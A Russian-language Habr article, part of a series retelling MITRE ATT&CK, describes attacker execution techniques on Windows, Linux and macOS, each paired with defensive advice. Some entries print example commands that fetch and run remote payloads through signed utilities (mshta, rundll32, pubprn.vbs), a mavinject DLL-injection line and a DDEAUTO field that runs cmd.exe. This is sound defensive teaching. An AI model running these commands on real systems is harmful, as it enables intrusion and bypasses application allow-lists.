Изучаем Adversarial Tactics, Techniques & Common Knowledge (ATT@CK). Часть 2

**Ссылки на все части:**  
[Часть 1\. Получение первоначального доступа](https://habr.com/post/423405/)  
[Часть 2\. Выполнение](https://habr.com/post/424027/)  
[Часть 3\. Закрепление](https://habr.com/post/425177/)  
[Часть 4\. Повышение привилегий](https://habr.com/post/428602/)  
[Часть 5\. Обход защиты](https://habr.com/post/432624/)

Фаза «Выполнение (Execution)», описывает применение злоумышленниками средств и методов удаленного и локального выполнения в атакуемой системе различных команд, сценариев и исполняемых файлов, которые были доставлены в неё на предыдущем этапе.  
  
_Автор не несет ответственности за возможные последствия применения изложенной в статье информации, а также просит прощения за возможные неточности, допущенные в некоторых формулировках и терминах. Публикуемая информация является свободным пересказом содержания [MITRE ATT&CK.](https://attack.mitre.org/wiki/Main_Page)_

### [AppleScript](https://attack.mitre.org/wiki/Technique/T1155)

_Система:_ macOS  
_Права:_ Пользователь  
_Описание:_ Язык AppleScript имеет возможность работы с Apple Event — сообщениями, которыми обмениваются приложения в рамках межпроцессного взаимодействия (IPC). С помощью Apple Event можно взаимодействовать практически с любым приложением, открытым локально или удаленно, вызывать такие события как открытие окон и нажатие клавиш. Скрипты запускаются с помощью команды: _Osascript -e &lt;скрипт&gt;_.  
Злоумышленники могут использовать AppleScript для скрытого открытия SSH-соединений с удаленными хостами, предоставления пользователям поддельных диалоговых окон. AppleScript также может использоваться в более распространенных типах атак, например, организации Reverse Shell.

_Рекомендации по защите:_ Обязательная проверка запускаемых сценариев AppleScript на наличие подписи доверенного разработчика.

### [CMSTP](https://attack.mitre.org/wiki/Technique/T1191)[(AppLocker ByPass — CMSTP)](https://pentestlab.blog/tag/scriptlet/)

_Система:_ Windows  
_Права:_ Пользователь  
_Описание:_ _Microsoft Connection Manager Profile Installer (cmstp.exe)_ — это встроенная в Windows утилита «Установщик профилей диспетчера подключений». Cmstp.exe может принимать в качестве параметра inf-файл, поэтому злоумышленник может подготовить специальный вредоносный INF для загрузки и выполнения DLL или скриптлетов (*.sct) с удаленных серверов в обход AppLocker и других блокировок, поскольку cmstp.exe подписан цифровым сертификатом Microsoft.

_Рекомендации по защите:_ Блокирование запуска потенциально-опасных приложений. Мониторинг запусков _C:\\Windows\\System32\\cmstp.exe_.

### [Интерфейс командной строки (Command-Line Interface)](https://attack.mitre.org/wiki/Technique/T1059)

_Система:_ Windows, Linux, macOS  
_Права:_ Пользователь, Администратор, System  
_Описание:_ С интерфейсом командной строки можно взаимодействовать локально, удаленно через ПО для удаленного доступа, посредством Reverse Shell и т.п. Команды выполняются с текущим уровнем разрешений процесса интерфейса командной строки, если команда не включает вызов процесса, который изменяет разрешения для выполнения команды (например, запланированная задача).

_Рекомендации по защите:_ Аудит и/или блокировка командной строки с помощью таких средств как AppLocker или политик ограниченного использования программ.

### [Элементы панели управления (Windows Control Panel Items)](https://attack.mitre.org/wiki/Technique/T1196)

_Система:_ Windows  
_Права:_ Пользователь, администратор, System  
_Описание:_ Тактика заключается в использовании злоумышленниками элементов панели управления Windows для выполнения в качестве полезной нагрузки произвольных команд (например, вирус _[Reaver](https://researchcenter.paloaltonetworks.com/2017/11/unit42-new-malware-with-ties-to-sunorcal-discovered)_). Вредоносные объекты могут быть замаскированы под стандартные элементы управления и доставлены в систему с помощью фишинговых вложений. Служебные программы для просмотра и настройки параметров Windows представляют собой зарегистрированные exe-файлы и CPL-файлы элементов панели управления Windows. CPL-файлы фактически являются переименованными DLL-библиотеками, которые можно запускать следующими способами:

*   непосредственно из командной строки: _control.exe **&lt;file.cpl&gt;**_;
*   с помощью API-функций из shell32.dll: _rundll32.exe shell32.dll,Control_RunDLL **&lt;file.cpl&gt;**_;
*   двойным щелчком мыши по cpl-файлу.

Зарегистрированные CPL, хранящиеся в System32, автоматически отображаются в Панели управления Windows и имеют уникальный идентификатор, хранящийся в реестре:  
_HKEY\_LOCAL\_MACHINE\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Explorer\\ControlPanel\\NameSpace_

Сведения о других CPL, например, отображаемое имя и путь к cpl-файлу хранятся в подразделах _«Cpls»_ и _«Extended Properties»_ раздела:  
_HKEY\_LOCAL\_MACHINE\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Control Panel_

Некоторые CPL, запускаемые через командную оболочку, зарегистрированы в разделе:  
_HKEY\_LOCAL\_MACHINE\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Controls Folder\**{name}**\\shellex\\PropertySheetHandlers_

_Рекомендация по защите:_ Ограничение запуска и хранения файлов элементов панели управления только в защищенных папках (например, _C:\\Windows\\System32_), включение контроля учетных записей (UAC) и AppLocker для предотвращения несанкционированных изменений в системе. Само собой, применение антивирусного ПО.

### [Протокол Dynamic Data Exchange (DDE),](https://attack.mitre.org/wiki/Technique/T1173) [Macro-less Code Exec in MSWord](https://sensepost.com/blog/2017/macro-less-code-exec-in-msword/)

_Система:_ Windows  
_Права:_ Пользователь  
_Описание:_ DDE — протокол взаимодействия приложений, которые совместно используют данные и общую память для обмена сообщениями. Например, в документе Word может содержаться таблица, автоматически обновляемая из документа Excel. Техника заключается в эксплуатации уязвимости в приложениях MS Office, связанной с использованием в MS Office протокола DDE. Злоумышленники могут встраивать в документы MS Office объекты, содержащие команды, которые будут исполнены при открытии документа. Например, документ Word может содержать объект Field (Поле), в значении которого указана команда _{DDEAUTO &lt;команда, например, c:\\windows\\system32\\cmd.exe&gt;}_, которая будет исполнена при открытии документа. Несмотря на утрату актуальности DDE может быть включен, в том числе, в Windows 10 и MS Office 2016, c помощью ключа:  
_AllowDDE (DWORD)_ = 2 в разделе реестра:  
_HKEY\_CURRENT\_USER\\Software\\Microsoft\\Office\**&lt;версия Office&gt;**\\Word\\Security_.

_Рекомендации по защите:_ Следуйте _[рекомендациям Microsoft](https://technet.microsoft.com/en-us/library/security/4053440)_ и установите соответствующее _[обновление MS Office](https://portal.msrc.microsoft.com/en-US/security-guidance/advisory/ADV170021)_. В Windows 10 можно так же включить параметр _Attack Surface Reduction (ASR)_, чтобы защититься от DDE-атак и порождения дочерних процессов приложениями MS Office.

### [Выполнение через API (Execution through API)](https://attack.mitre.org/wiki/Technique/T1106)

_Система:_ Windows  
_Права:_ Пользователь, администратор, System  
_Описание:_ Злоумышленники могут использовать интерфейс API для исполнения двоичных файлов. Такие API-функции, как CreateProcess, позволяют программам и скриптам запускать процессы c указанием необходимых путей и аргументов. API-функции, которые могут быть использованы для выполнения двоичных файлов:

*   CreateProcessA(), CreateProcessW();
*   CreateProcessAsUserA(), CreateProcessAsUserW();
*   CreateProcessInternalA(), CreateProcessInternalW();
*   CreateProcessWithLogonW(), CreateProcessWithTokenW();
*   LoadLibraryA(), LoadLibraryW();
*   LoadLibraryExA(), LoadLibraryExW();
*   LoadModule();
*   LoadPackagedLibrary();
*   WinExec();
*   ShellExecuteA(), ShellExecuteW();
*   ShellExecuteExA(), ShellExecuteExW()​​.

_Рекомендации по защите:_ Вызовы функций API — это обычное явление, которое трудно отличить от вредоносной активности. Вектор защиты нужно направлять на предотвращение запуска инструментов злоумышленника в начале цепочки атаки, выявление вредоносного поведения и блокирование потенциально-опасного ПО.

### [Выполнение через загрузчик модулей Windows (Execution through Module Load)](https://attack.mitre.org/wiki/Technique/T1129)

_Система:_ Windows  
_Права:_ Пользователь  
_Описание:_ Выполнение кода возможно организовать с помощью загрузчика модулей Windows — NTDLL.dll, который может загрузить DLL-библиотеку по произвольному локальному или сетевому пути. NTDLL.dll является частью API Windows и может вызывать такие функции как _CreateProcess ()_ и _LoadLibrary ()_.

_Рекомендации по защите:_ Вызовы функций API — это штатный функционал ОС, который трудно отличить от вредоносной активности. Вектор защиты необходимо направлять на предотвращение запуска инструментов злоумышленника в начале цепочки атаки. имеет смысл рассмотреть возможность ограничения загрузки DLL каталогами _%SystemRoot%_ и _%ProgramFiles%_.

### [Выполнение с помощью эксплойтов (Exploitation for Client Execution)](https://attack.mitre.org/wiki/Technique/T1203)

_Система:_ Windows, Linux, macOS  
_Права:_ Пользователь  
_Описание:_ Техника предполагает удаленное выполнение кода с помощью эксплойтов в пользовательском ПО. Наличие уязвимостей в ПО зачастую связано с нарушением разработчиками софта требований безопасного программирования, что в конечном итоге приводит к возможности вызвать непредвиденное поведение ПО.  
Рассмотрим некоторые типы эксплойтов:

*   Эксплойты браузеров. Веб-браузеры являются целью при применении злоумышленниками теневой загрузки и фишинговых ссылок. Атакуемая система может быть скомпрометирована через обычный браузер после выполнения пользователем определенных действий, например, перехода по ссылке, указанной в фишинговом письме.
*   Эксплойты офисных приложений. Вредоносные файлы передаются в виде вложений или ссылок на скачивание. Для эксплуатации уязвимости пользователь должен открыть документ или файл для запуска эксплойта.
*   Эксплойты приложений сторонних производителей. Распространенные приложения, такие как Adobe Reader и Flash, часто используемые в корпоративных средах, являются мишенью для злоумышленников. В зависимости от ПО и характера уязвимости эксплуатация уязвимостей происходит в браузере или при открытии пользователем файла, например, объекты Flash могут доставляться в документах MS Office.

_Рекомендации по защите:_ Своевременная установка обновлений используемых приложений. Применение всевозможных средств изоляции потенциально уязвимых приложений – песочниц, средств микросегментации и виртуализации, например, _[Sandboxie](https://www.sandboxie.com/)_ для Windows и Apparmor, Docker для Linux. Так же рекомендуется применение систем защиты от эксплойтов, например, _[Windows Defender Exploit Guard (WDEG)](https://docs.microsoft.com/ru-ru/windows/security/threat-protection/windows-defender-exploit-guard/windows-defender-exploit-guard)_ для Windows 10 или [Enhanced Mitigation Experience Toolkit (EMET)](https://support.microsoft.com/ru-ru/help/2458544/the-enhanced-mitigation-experience-toolkit) для более ранних версий Windows.

### [Графический интерфейс пользователя (Graphical User Interface)](https://attack.mitre.org/wiki/Technique/T1061)

_Система:_ Windows, Linux, macOS  
Права: Пользователь, администратор, system  
_Описание:_ Запуск исполняемого файла или сценария происходит при взаимодействии с файлом через графический интерфейс пользователя (GUI) в интерактивном или удаленном сеансе, например, по протоколу RDP.

_Рекомендации по защите:_ Защищайте учетные данные, которые могут быть использованы для удаленного подключения в систему. Выявляйте ненужные системные утилиты, ПО сторонних разработчиков, которые могут быть использованы для входа в интерактивный удаленный режим.

### [InstallUtil](https://attack.mitre.org/wiki/Technique/T1118)

_Система:_ Windows  
_Права:_ Пользователь  
_Описание:_ InstallUtil — утилита командной строки Windows, которая может устанавливать и удалять приложения, соответствующие спецификациям .NET Framework. Installutil автоматически устанавливается вместе с VisualStudio. Файл InstallUtil.exe подписан сертификатом Microsoft и хранится в:  
_C:\\Windows\\Microsoft.NET\\Framework\\v\[version\]\\InstallUtil.exe_  
Злоумышленники могут использовать функционал InstallUtil для прокси-выполнения кода и обхода белых списков приложений.

_Рекомендации по защите:_ Возможно в вашей системе не используется InstallUtil, поэтому рассмотрите возможность блокировки запуска InstallUtil.exe.

### [Драйверы LSASS (LSASS Driver)](https://attack.mitre.org/wiki/Technique/T1177)

_Система:_ Windows  
_Права:_ Администратор, system  
_Описание:_ Local Security Authority (LSA) — подсистема Windows, обеспечивающая аутентификацию пользователя. LSA включает несколько динамических взаимосвязанных библиотек DLL, которые выполняются в процессе LSASS.exe. Злоумышленники могут атаковать LSASS.exe путем замены или добавления нелегитимных драйверов LSA с последующим выполнением произвольного кода. Техника реализована во вредоносных программах Pasam и Wingbird, которые «подбрасывают» модифицированные DLL, используемые при загрузке LSASS. При этом вредоносный код выполняется до того, как нелегитимная DLL вызовет сбой и последующее падение службы LSASS.

_Рекомендации по защите:_ В Windows 8.1 и Windows Server 2012 R2 включите защиту LSA путём установки ключа реестра:  
_HKEY\_LOCAL\_MACHINE\\SYSTEM\\CurrentControlSet\\Control\\Lsa\\RunAsPPL_  
в значение _dword:00000001_

Эта защита гарантирует, что загружаемые LSA плагины и драйверы будут подписаны цифровой подписью Microsoft. В Windows 10 и Server 2016 включите _[Windows Defender Credential Guard](https://docs.microsoft.com/en-us/windows/security/identity-protection/credential-guard/credential-guard-manage)_ для запуска lsass.exe в изолированной виртуальной среде. Включите режим безопасного поиска DLL для снижения риска загрузки в lsass.exe вредоносных библиотек:  
_HKEY\_LOCAL\_MACHINE\\System\\CurrentControlSet\\Control\\Session Manager\\SafeDllSearchMode_.

### [Launchctl](https://attack.mitre.org/wiki/Technique/T1152)

_Система:_ macOS  
_Права:_ Пользователь, администратор  
_Описание:_ Launchctl — утилита для управления сервисом Launchd. C помощью Launchctl можно управлять системными и пользовательскими сервисами (LaunchDeamons и LaunchAgents), а также выполнять команды и программы. Launchctl поддерживает подкоманды в командной строке, интерактивные или перенаправленные со стандартного ввода:  
_launchctl submit -l \[labelname\] — /Path/to/thing/to/execute ''arg" ''arg" ''arg"_.  
Запуская и перезапуская сервисы и демоны злоумышленники могут выполнить код и даже обойти белый список, если launchctl является разрешенным процессом, однако загрузка, выгрузка и перезагрузка сервисов и демонов может требовать повышенных привилегий.

_Рекомендации по защите:_ Ограничение прав пользователей на создание Launch Agents и запуск Launch Deamons с помощью групповой политики. С помощью приложения _KnockKnock_ можно обнаружить программы, которые используют launchctl для управления Launch Agents и Launch Deamons.

### [Выполнение с помощью локального планирования задач (Local Job Scheduling)](https://attack.mitre.org/wiki/Technique/T1168)

_Система:_ Linux, macOS  
_Права:_ Пользователь, администратор, root  
_Описание:_ Злоумышленники могут создать в атакуемых системах задания для несанкционированного запуска программ при загрузке системы или по расписанию. В системах Linux и Apple поддерживается несколько методов планирования запуска периодических фоновых задач: cron, at, launchd. В отличие от Планировщика задач Windows, планирование заданий в Linux-системах невозможно осуществить удаленно, за исключением использования удаленных сеансов типа SSH.

_Рекомендации по защите:_ Ограничение прав пользователей на создание планируемых заданий, блокировка системных утилит и другого ПО, которое может использоваться для планирования заданий.

### [Mshta](https://attack.mitre.org/wiki/Technique/T1170)

_Система:_ Windows  
_Права:_ Пользователь  
_Описание:_ Mshta.exe (расположена в _C:\\Windows\\System32\_) — это утилита, которая выполняет приложения Microsoft HTML (*.HTA). HTA-приложения выполняются с использованием тех же технологий, которые использует InternetExplorer, но вне браузера. В связи с тем, что Mshta обрабатывает файлы в обход настроек безопасности браузера злоумышленники могут использовать mshta.exe для прокси-выполнения вредоносных HTA-файлов, Javascript или VBScript. Вредоносный файл можно запустить через встроенный скрипт:  
_mshta vbscript:Close(Execute(«GetObject(»«script:https\[:\]//webserver/payload\[.\]sct»")"))_

или напрямую, по URL-адресу:  
_mshta http\[:\]//webserver/payload\[.\]hta_

_Рекомендации по защите:_ Функциональность mshta.exe связана со старыми версиями IE, достигшими конца жизненного цикла. Блокируйте Mshta.exe, если не используете его функциональность.

### [PowerShell](https://attack.mitre.org/wiki/Technique/T1086)

_Система:_ Windows  
_Права:_ Пользователь, администратор  
_Описание:_ PowerShell (PS) — это мощный интерактивный интерфейс командной строки и среда для выполнения сценариев, включенная в систему Windows. Злоумышленники могут использовать PS для сбора информации и выполнения кода. Для примера, командлет Start-Process может запустить исполняемый файл, командлет Invoke-Command выполнит команду локально или на удаленном компьютере. PS также можно использовать для загрузки и запуска исполняемых файлов из интернета, без сохранения их на жесткий диск. Для удаленных подключений с помощью PS требуются права администратора. Существует целый ряд инструментов для атак на PS:

*   _[Empire](https://github.com/EmpireProject/Empire)_
*   _[PowerSploit](https://github.com/PowerShellMafia/PowerSploit)_
*   _[PSAttack](https://github.com/jaredhaight/PSAttack)_

_Рекомендации по защите:_ PS можно удалить из системы, если в нём нет необходимости. Если PS требуется, то следует ограничить возможность его запуска администраторами и выполнением только подписанных сценариев. Отключите службу WinRM, чтобы предотвратить удаленное выполнение PS-скриптов. Следует отметить, что существуют [методы обхода политик выполнения PS-скриптов](https://blog.netspi.com/15-ways-to-bypass-the-powershell-execution-policy/).

### [Regsvcs/Regasm](https://attack.mitre.org/wiki/Technique/T1121)

_Система:_ Windows  
_Права:_ Пользователь, администратор  
_Описание:_ Regsvcs и Regasm — это служебные утилиты Windows, используемые для регистрации в системе сборок .NET Component Object Model (COM). Оба файла подписаны цифровой подписью Microsoft. Злоумышленники могут использовать Regsvcs и Regasm для прокси-выполнения кода, когда в качестве атрибута указывается код, который должен быть запущен до регистрации или отмены регистрации: \[ComRegisterFunction\] или \[ComUnregisterFunction\]. Код с такими атрибутами может быть запущен даже если процесс выполняется с недостаточными привилегиями или вовсе «падает» при старте.

_Рекомендации по защите:_ Заблокируйте Regsvcs.exe и Regasm.exe если они не используются в вашей системе или сети.

### [Regsvr32](https://attack.mitre.org/wiki/Technique/T1117) [(Squiblydoo)](https://www.anti-malware.ru/news/2018-03-15-1447/25725%E2%80%8B)

_Система:_ Windows  
_Права:_ Пользователь, администратор  
_Описание:_ Regsvr32.exe — это консольная утилита для регистрации и отмены регистрации в реестре элементов управления OLE, например, ActiveX и DLL-библиотек. Regsvr32.exe подписан цифровой подписью Microsoft и может использоваться для прокси-выполнения кода. Например, с помощью Regsvr32 можно загрузить XML-файл, содержащий куски Java-кода (скриплеты), которые будут выполнены в обход белого списка.

_Рекомендации по защите:_ Attack Surface Reduction (ASR) в EMET и Advanced Theart Protection в Защитнике Windows могут обеспечить блокировку использования Regsvr32.exe для обхода белых списков.

### [Rundll32](https://attack.mitre.org/wiki/Technique/T1085) [(Poweliks)](https://www.symantec.com/security-center/writeup/2014-080408-5614-99%E2%80%8B)

_Система:_ Windows  
_Права:_ Пользователь  
_Описание:_ Rundll32.exe — это системная утилита для запуска программ, находящихся в динамически подключаемых библиотеках, может вызываться для прокси-выполнения двоичного файла, выполнения файлов элементов управления Windows (.cpl) через недокументированные функции shel32.dll — _Control_RunDLL_ и _Control_RunDLLAsUser_. Двойной клик по файлу .cpl также вызывает выполнение Rundll32.exe. Rundll32 также может использоваться для выполнения сценариев, таких как JavaScript:  
_rundll32.exe javascript:"\\..\\mshtml,RunHTMLApplication";document.write();GetObject(«scrirpt:https\[:\]//www\[.\]example\[.\]com/malicious.sct»)"_  
Вышеописанный метод использования rundll32.exe детектируется антивирусным программным обеспечением, как вирус типа Poweliks.  
Рекомендации по защите: Attack Surface Reduction (ASR) в EMET и Advanced Theart Protection в Защитнике Windows могут обеспечить блокировку использования Rundll32.exe для обхода белых списков.

### [Выполнение с помощью планирования задач Windows (Scheduled Task)](https://attack.mitre.org/wiki/Technique/T1053)

_Система:_ Windows  
_Права:_ Пользователь, администратор, система  
_Описание:_ Такие утилиты как at, schtasks и Планировщик задач Windows могут использоваться для планирования запуска программ и сценариев, которые будут выполнятся в определенную дату и время. Задачу можно запланировать в удаленной системе, при условии, что для проверки подлинности используется RPC и включен общий доступ к принтерам и файлам. Кроме того, для планирования задач в удаленной системе требуются права администратора. Злоумышленники могут использовать удаленное планирование задач для выполнения программ при старте системы или в контексте определенной учетной записи.

_Рекомендации по защите:_ Включите ограничение прав на создание заданий пользователями от имени System в реестре:  
_HKLM\\SYSTEM\\CurrentControlSet\\Control\\Lsa\\SubmitControl = 0_  
_Примечание:_ SubmitControl = 1, разрешит создавать задания членам группы Server Operators.

Также выполните соответствующую конфигурацию GPO:  
_Computer Configuration > \[Policies\] > Windows Settings > Security Settings > Local Policies > Security Options: Domain Controller: Allow server operators to schedule tasks: disabled_  
_Computer Configuration > \[Policies\] > Windows Settings > Security Settings > Local Policies > User Rights Assignment: Increase scheduling priority_  
Рассмотрите целесообразность применения в своей деятельности PowerSploit Framework, который содержит модуль PowerUP для поиска уязвимостей в разрешениях запланированных задач.

### [Скриптинг (Scripting)](https://attack.mitre.org/wiki/Technique/T1064)

_Система:_ Windows, Linux, macOS  
_Права:_ Пользователь  
_Описание:_ Злоумышленники могут использовать скрипты для автоматизации своих действий, ускорения операционных задач и, как следствие, сокращения времени, необходимого для получения доступа. Некоторые скриптовые языки могу использоваться для обхода механизмов мониторинга процессов путем непосредственного взаимодействия с ОС на уровне API вместо вызова других программ. Скрипты могут быть встроены в документы Office в виде макросов и затем использованы для фишинговой атаки. В этом случае злоумышленники рассчитывают на запуск пользователем файла с макросом или на то, что пользователь согласится активировать макрос. Существует несколько популярных фреймворков для реализации скриптинга — Metasploit, Veil, PowerSploit.

_Рекомендации по защите:_ Ограничивайте доступ к сценариям, таким как VBScript или PowerShell. В Windows настройте параметры безопасности MS Office включив защищенный просмотр и запрет макросов через GPO. Если макросы нужны, то разрешите запуск только подписанных доверенной цифровой подписью макросов. Применяйте микросегментацию и виртуализацию приложений, например, Sandboxie для Windows и Apparmor, Docker для Linux.

### [Запуск служб (Service Execution)](https://attack.mitre.org/wiki/Technique/T1035)

_Система:_ Windows  
_Права:_ Администратор, System  
_Описание:_ Злоумышленники могут выполнить двоичный код, команду или скрипт с помощью специальных методов взаимодействия со службами Windows, например, с помощью _Диспетчера управления службами (SCM)_ можно создавать новые сервисы и модифицировать запущенные.

_Рекомендации по защите:_ Убедитесь, что текущая настройка прав в системе запрещает запуск служб с высокими привилегиями пользователями с низкими привилегиями. Убедитесь, что исполняемые файлы с высоким уровнем разрешений в системе не могут быть заменены или изменены пользователями с более низким уровнем разрешений. Рассмотрите возможность применения средств ограничения запуска потенциально-опасных программ с помощью AppLocker и настройки политик ограничения программного обеспечения (_[Software Restriction Policies](https://technet.microsoft.com/en-us/library/2008.06.srp.aspx)_).

### [Выполнение через подписанные бинарники (Signed Binary Proxy Execution)](https://attack.mitre.org/wiki/Technique/T1218)

_Система:_ Windows  
_Права:_ Пользователь  
_Описание:_ Бинарные файлы, подписанные доверенными цифровыми сертификатами, могут выполняться в системах Windows, защищенных проверкой цифровой подписи. Несколько файлов Microsoft, подписанных по умолчанию при установке Windows, могут быть использованы для проксирования запуска других файлов:  
**Mavinject.exe** — это утилита Windows, которая позволяет выполнять код. Mavinject может использоваться для ввода DLL в запущенный процесс:  
_«C:\\Program Files\\Common Files\\microsoft shared\\ClickToRun\\MavInject32.exe» \[PID\] /INJECTRUNNING \[PATH DLL\]_  
_C:\\Windows\\system32\\mavinject.exe \[PID\] /INJECTRUNNING \[PATH DLL\]_  
**SyncAppvPublishingServer.exe** — может использоваться для запуска powershell-скриптов без запуска powershell.exe.  
Существует ещё _[несколько аналогичных бинарников](https://github.com/api0cradle/UltimateAppLockerByPassList)_.

_Рекомендации по защите:_ Многие подписанные файлы могут не использоваться в вашей системе, поэтому рассмотрите возможность блокирования их запуска.

### [Выполнение через подписанные сценарии (Signed Script Proxy Execution)](https://attack.mitre.org/wiki/Technique/T1216)

_Система:_ Windows  
_Права:_ Пользователи  
_Описание:_ Скрипты, подписанные доверенными сертификатами, могут использоваться для проксирования вредоносных файлов, например, файл _PubPrn.vbs_ подписан сертификатом Microsoft и может использоваться для запуска файла с удаленного сервера:  
_cscript C:\\Windows\\System32\\Printing\_Admin\_Scripts\\ru-RU\\pubprn.vbs 127.0.0.1 script:http\[:\]//192.168.1.100/hi.png_

_Рекомендации по защите:_ Подобные подписанные скрипты могут не требоваться в вашей системе, поэтому рассмотрите возможность блокирования их запуска.

### [Команда Source](https://attack.mitre.org/wiki/Technique/T1153)

_Система:_ Linux и macOS  
_Права:_ Пользователь  
_Описание:_ Source — команда, которая позволяет прочитать и выполнить все команды из указанного файла в текущей командной оболочке, это значит, что все заданные переменные окружения будут видны во всех скриптах и командах, которые будут запускаться. Source можно запустить двумя способами:  
_source /path/to/filename \[arguments\]_ или _. /path/to/filename \[arguments\]_  
Обратите внимание на пробел после точки. Без пробела программа будет запущена в новой командной оболочке. Злоумышленники могут использовать Source для выполнения файлов, непомеченных флагом «x», как исполняемые.

_Рекомендации по защите:_ Предотвратить использование в системе встроенных команд довольно непросто в виду их легальности, поэтому вектор защиты необходимо направить на предотвращение вредоносных действий на более ранних этапах атаки, например, на стадии доставки или создания вредоносного файла в системе.

### [Пробел после имени файла (Space after Filename)](https://attack.mitre.org/wiki/Technique/T1151)

_Система:_ Linux, macOS  
_Права:_ Пользователь  
_Описание:_ Злоумышленники могут скрывать истинный тип файла, изменяя его расширение. При определённых типах файлов (не работает с файлами .app) добавление символа пробела в конец имени файла изменит способ обработки файла операционной системой. Например, если есть исполняемый файл Mach-O с именем evil.bin, то при двойном щелчке пользователем ОС запустит Terminal.app и выполнит его. Если этот же файл переименовать в evil.txt, то при двойном щелчке он запуститься в текстовом редакторе. Однако, если файл переименовать в «evil.txt » (пробел в конце), то при двойном щелчке тип истинного файла определиться ОС и запустится двоичный файл. Злоумышленники могут использовать эту технику для обмана пользователя и запуска им вредоносного исполняемого файла.

_Рекомендации по защите:_ Использование этой техники трудно предотвратить, т.к. злоумышленник использует штатные механизмы работы ОС, поэтому вектор защиты необходимо направить на предотвращение вредоносных действий на более ранних этапах атаки, например, на стадии доставки или создания вредоносного файла в системе.

### [Выполнение с помощью стороннего ПО для администрирования сети (Third-party Software)](https://attack.mitre.org/wiki/Technique/T1072)

_Система:_ Windows, Linux, macOS  
_Права:_ Пользователь, администратор, System  
_Описание:_ Вектор атаки направляется на стороннее ПО и системы развертывания ПО, которые используются в атакуемой сети для нужд администрирования (SCCM, VNC, HBSS, Altris и т.п.). В случае получения злоумышленником доступа к таким системам противник получает возможность удаленного запуска кода на всех хостах, подключенных к системе развертывания ПО. Права, необходимые для реализации данной техники зависят от конкретной конфигурации систем. Локальных учетных данных может быть достаточно для доступа к серверу развертывания ПО, однако для запуска развертывания ПО может потребоваться учетная запись администратора.

_Рекомендации по защите:_ Проверяйте уровень безопасности применяемых систем развертывания ПО. Убедитесь, что доступ к системам управления ПО ограничен, контролируется и защищен. Строго используйте политики обязательного предварительного одобрения удаленного развертывания ПО. Предоставляйте доступ к системам развертывания ПО ограниченному числу администраторов, обеспечьте изоляцию системы развертывания ПО. Убедитесь, что учетные данные для доступа системе развертывания ПО уникальны и не используются в других сервисах корпоративной сети. Если система развертывания ПО настроена на запуск только подписанных двоичных файлов, то проверьте, что доверенные сертификаты не хранятся в самой системе развертывания ПО, а расположены в системе, удаленный доступ к которой невозможен.

### [Команда Trap](https://attack.mitre.org/wiki/Technique/T1154)

_Система:_ Linux, macOS  
_Права:_ Пользователь, администратор  
_Описание:_ Команда trap служит для защиты скрипта от прерываний (ctrl+c, ctrl+d, ctrl+z и т.п.). Если скрипт получает сигнал о прерывании, указанном в аргументах команды trap, то он обрабатывает сигнал прерывания самостоятельно, при этом командная оболочка такой сигнал обрабатывать не будет. Злоумышленники могут использовать trap для регистрации кода, который будет выполняться при получении командной оболочкой определенных сигналов прерываний.

_Рекомендации по защите:_ Использование этой техники трудно предотвратить, потому что злоумышленник использует штатные механизмы работы ОС. Вектор защиты следует направить на предотвращение вредоносных действий на более ранних этапах атаки, например, на стадии доставки или создания вредоносного файла в системе.

### [Выполнение через доверенные утилиты разработчиков софта (Trusted Developer Utilities)](https://attack.mitre.org/wiki/Technique/T1127)

_Система:_ Windows  
_Права:_ Пользователь  
_Описание:_ Существует множество утилит, которые используются разработчиками ПО и которые могут быть использованы для выполнения кода в различной форме при разработке, отладке и реверс-инжиниринге ПО. Эти утилиты часто подписаны цифровыми сертификатами, которые позволяют им выполнять в ОС проксирование вредоносного кода в обход защитных механизмов и белых листов приложений.

**MSBulid** — это платформа для создания ПО, используемая в Visual Studio. Она использует проекты в виде XML-файлов, которые описывают требования для построения различных платформ и конфигураций. MSBuild из .NET версии 4 позволяет вставить код C# в XML-проект, скомпилировать его и затем выполнить. MSBulid.exe подписан цифровым сертификатом Microsoft.  
**DNX** — .Net Execution Environmant (dnx.exe) представляет собой набор для разработки ПО (development kit) в составе Visual Studio Enterprise. Упразднен начиная с .NET Core CLI в 2016 году. DNX отсутствует в стандартных сборках Windows и может присутствовать только на хостах разработчиков при использовании .Net Core и ASP.NET Core 1.0. Dnx.exe подписан цифровым сертификатом и может использоваться для прокси-выполнения кода.  
**RCSI** — не интерактивный командный интерфейс для C#, похож на csi.exe. Был представлен в ранней версии платформы компилятора Roslyn .Net. Rcsi.exe подписан цифровым сертификатом Microsoft. Файлы сценариев C# .csx могут быть записаны и выполнены с помощью Rcsi.exe в командной строке Windows.  
**WinDbg/CDB** — это ядро MS Windows и утилита для отладки в режиме user-mode. Отладчик консоли Microsoft cdb.exe также является отладчиком в режиме user-mode. Обе утилиты могут использоваться как автономные инструменты. Обычно используются при разработке ПО, реверс-инжиниринге и не могут быть найдены в обычных системах Windows. Оба файла WinDbg.exe и CDB.exe подписаны цифровым сертификатом Microsoft и могут использоваться для проксирования кода.  
**Tracker** — утилита отслеживания файлов tracker.exe. Включена в .NET как часть MSBuild. Используется для регистрации вызовов в файловой системе Windows 10. Злоумышленники могут использовать tracker.exe для выполнения DLL в различных процессах. Tracker.exe также подписан сертификатом Microsoft.

_Рекомендации по защите:_ Все вышеописанные файлы подлежат удалению из системы, если они не используются по прямому назначению пользователями.

### [Выполнение пользователем (User Execution)](https://attack.mitre.org/wiki/Technique/T1204)

_Система:_ Windows, Linux, macOS  
_Права:_ Пользователь  
_Описание:_ Злоумышленники могут рассчитывать на определенные действия пользователя с целью выполнения им определенных действий. Это может быть прямое выполнение кода, когда пользователь открывает вредоносный исполняемый файл, доставленный в виде фишингового вложения с иконкой и видимым расширением файла документа. Иногда, могут быть использованы и иные техники, например, когда пользователь нажимает на ссылку в фишинговом письме, что приводит к эксплуатации уязвимости браузера. Техника «выполнение пользователем» часто применяется на других стадиях вторжения, например, когда злоумышленник помещает файл в общий каталог или на рабочий стол пользователя, рассчитывая на то что тот «нажмет» на него.

_Рекомендации по защите:_ Повышение осведомленности пользователей. Блокировка загрузки таких файлов, как .scr, .exe, .pif, .cpl и т.д. Применение антивирусного ПО и внедрение IPS-систем.

### [Windows Management Instrumentation (WMI)](https://attack.mitre.org/wiki/Technique/T1047)

_Система:_ Windows  
_Права:_ Пользователь, администратор  
